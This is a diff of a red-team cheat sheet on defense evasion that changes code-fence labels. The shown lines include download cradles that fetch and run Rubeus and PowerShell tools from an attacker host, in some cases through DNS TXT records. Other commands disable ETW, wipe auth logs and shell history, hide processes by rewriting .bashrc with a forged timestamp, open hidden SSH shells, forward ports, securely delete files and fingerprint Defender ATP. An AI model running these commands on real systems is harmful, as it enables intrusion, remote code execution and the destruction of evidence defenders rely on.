@@ -17,7 +17,7 @@
 
 ## .NET Reflection
 
-```c
+```console
 PS C:\> $d = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
 PS C:\> $a = [System.Reflection.Assembly]::Load($d)
 PS C:\> [Rubeus.Program]::Main("-h".Split())
@@ -33,21 +33,21 @@ Instead of using `IEX` and `IWR` within assessments, try this:
 | --- | --- | --- | --- |
 | cradle1 | TXT | "IEX(New-Object Net.WebClient).DownloadString($URI)" | 3600 |
 
-```c
+```console
 C:\> powershell . (nslookup -q=txt cradle1.domain.example)[-1]
 ```
 
-```c
+```console
 PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
 ```
 
-```c
+```console
 PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"""";'(nslookup -q=txt cradle1.domain.example)[-1]';Get-Domain'
 ```
 
 Example with `PowerSharpPack`.
 
-```c
+```console
 C:\> powershell
 PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
 PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"""";'(nslookup -q=txt cradle1.example.domain)[-1]';PowerSharpPack'
@@ -55,19 +55,19 @@ PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/S3cur3Th1sSh1t/Po
 
 ### Concatinate Payloads
 
-```c
+```console
 PS C:\> powershell . (-Join (Resolve-DnsName -Type txt https://<DOMAIN>).Strings)
 ```
 
 ## Bypassing Event Tracing for Windows (ETW)
 
-```c
+```console
 C:\> set COMPlus_ETWEnabled=0
 ```
 
 ## Clear Linux History
 
-```c
+```console
 * echo "" > /var/log/auth.log
 * echo "" > ~/.bash_history
 * rm ~/.bash_history
@@ -81,7 +81,7 @@ C:\> set COMPlus_ETWEnabled=0
 
 ## Hiding SSH Sessions
 
-```c
+```console
 $ ssh -o UserKnownHostsFile=/dev/null -T <USERNAME>@<RHOST> 'bash -i'
 ```
 
@@ -91,7 +91,7 @@ $ ssh -o UserKnownHostsFile=/dev/null -T <USERNAME>@<RHOST> 'bash -i'
 
 ## Logfile Cleaning
 
-```c
+```console
 $ cd /dev/shm; grep -v '<RHOST>' /var/log/auth.log > <FILE>.log; cat <FILE>.log > /var/log/auth.log; rm -f <FILE>.log
 ```
 
@@ -103,24 +103,24 @@ Notice that this modification of the logfile is most likely to be spotted.
 
 `<FILE>.url`:
 
-```c
+```console
 [internetshortcut]
 url=C:\Windows\system32\calc.exe
 ```
 
-```c
+```console
 C:\Windows\system32> rundll32 C:\Windows\system32\ieframe.dll,OpenURL C:\<FILE>.url
 ```
 
 ### Port Forwarding with netsh
 
-```c
+```console
 C:\> netsh interface portproxy add v4tov4 listenaddress=<RHOST> listenport=<RPORT> connectaddress=<LHOST> connectport=<LPORT>
 ```
 
 ## Process Hiding
 
-```c
+```console
 $ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
 $ echo 'top(){ command top "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
 $ echo 'htop(){ command htop "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
@@ -133,13 +133,13 @@ $ echo 'pstree(){ command pstree "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GR
 
 > https://github.com/haad/proxychains
 
-```c
+```console
 $ proxychains <APPLICATION>
 ```
 
 ### Configuration
 
-```c
+```console
 socks4 metasploit
 socks5 ssh
 socks4  127.0.0.1 1080
@@ -148,26 +148,26 @@ socks5  127.0.0.1 1080
 
 ### Proxychain the whole Terminal Input
 
-```c
+```console
 $ proxychains zsh
 $ nmap -p 80 <RHOST>
 ```
 
 ## Save File Deletion
 
-```c
+```console
 $ shred -z <FILE>
 ```
 
 Alternatively:
 
-```c
+```console
 $ FN=<FILE>; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
 ```
 
 ## Sneaky Directory
 
-```c
+```console
 $ sudo mkdir -p /mnt/.../<DIRECTORY>
 ```
 
@@ -192,19 +192,19 @@ File Paths:
 
 ### Check Registry
 
-```c
+```console
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection /s
 ```
 
 ### Check Service
 
-```c
+```console
 C:\> sc query sense
 PS C:\> Get-Service Sense
 ```
 
 ### Process
 
-```c
+```console
 C:\> tasklist | findstr /i mssense.exe
 ```
